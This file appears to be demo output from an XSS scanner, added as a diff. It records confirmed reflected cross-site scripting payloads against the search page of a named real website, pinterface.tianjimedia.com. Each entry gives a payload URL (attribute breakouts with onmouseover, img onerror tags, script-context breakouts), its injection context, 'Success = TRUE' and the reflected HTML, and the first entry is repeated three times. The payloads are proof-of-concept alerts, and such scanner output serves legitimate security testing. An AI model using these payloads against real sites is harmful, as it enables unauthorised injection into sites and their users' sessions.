@@ -1,0 +1,55 @@
+Demo/pinterface.tianjimedia.com
+
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+Context = ATTR
+Success = TRUE
+Detection:
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />'
+b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />'
+b'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value=\'\';">'
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+Context = ATTR
+Success = TRUE
+Detection:
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />'
+b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />'
+b'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value=\'\';">'
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=" onmouseover="alert`1`
+Context = ATTR
+Success = TRUE
+Detection:
+b'<meta name="keywords" content="" onmouseover="alert`1`," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7," onmouseover="alert`1`\xe5\xa4\xa7\xe5\x85\xa8," onmouseover="alert`1`\xe6\x8a\xa5\xe4\xbb\xb7\xe5\xa4\xa7\xe5\x85\xa8" />'
+b'<meta name="description" content="\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93_wap\xe7\x89\x88\xe6\x8f\x90\xe4\xbe\x9b" onmouseover="alert`1`\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7\xe4\xbf\xa1\xe6\x81\xaf,\xe5\x8c\x85\xe6\x8b\xac" onmouseover="alert`1`\xe4\xbb\xb7\xe6\xa0\xbc,\xe5\x8f\x82\xe6\x95\xb0,\xe8\xaf\x84\xe6\xb5\x8b,\xe5\x9b\xbe\xe7\x89\x87,\xe8\xae\xba\xe5\x9d\x9b\xe7\xad\x89\xe8\xaf\xa6\xe7\xbb\x86\xe5\x86\x85\xe5\xae\xb9." />'
+b'<input type="text" id = "textin" value="" onmouseover="alert`1`" name="keyword" class="wapin" onClick="this.value=\'\';">'
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=<img src=x onerror='alert`1`'>
+Context = HTML
+Success = TRUE
+Detection:
+b"<img src=x onerror='alert`1`'>\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7-<img src=x onerror='alert`1`'>\xe5\xa4\xa7\xe5\x85\xa8-\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93-wap\xe7\x89\x88</title>"
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=<img src=x onerror="alert`1`">
+Context = HTML
+Success = TRUE
+Detection:
+b'<img src=x onerror="alert`1`">\xe6\x9c\x80\xe6\x96\xb0\xe6\x8a\xa5\xe4\xbb\xb7-<img src=x onerror="alert`1`">\xe5\xa4\xa7\xe5\x85\xa8-\xe5\xa4\xa9\xe6\x9e\x81\xe4\xba\xa7\xe5\x93\x81\xe5\xba\x93-wap\xe7\x89\x88</title>'
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword='; confirm`1`; '
+Context = SCRIPT
+Success = TRUE
+Detection:
+
+-----------------------------------------------------------------------------------------------------
+http://pinterface.tianjimedia.com/front/wap/searchresult.jsp?keyword=</script><script>alert`1`</script>
+Context = SCRIPT
+Success = TRUE
+Detection:
+
+-----------------------------------------------------------------------------------------------------
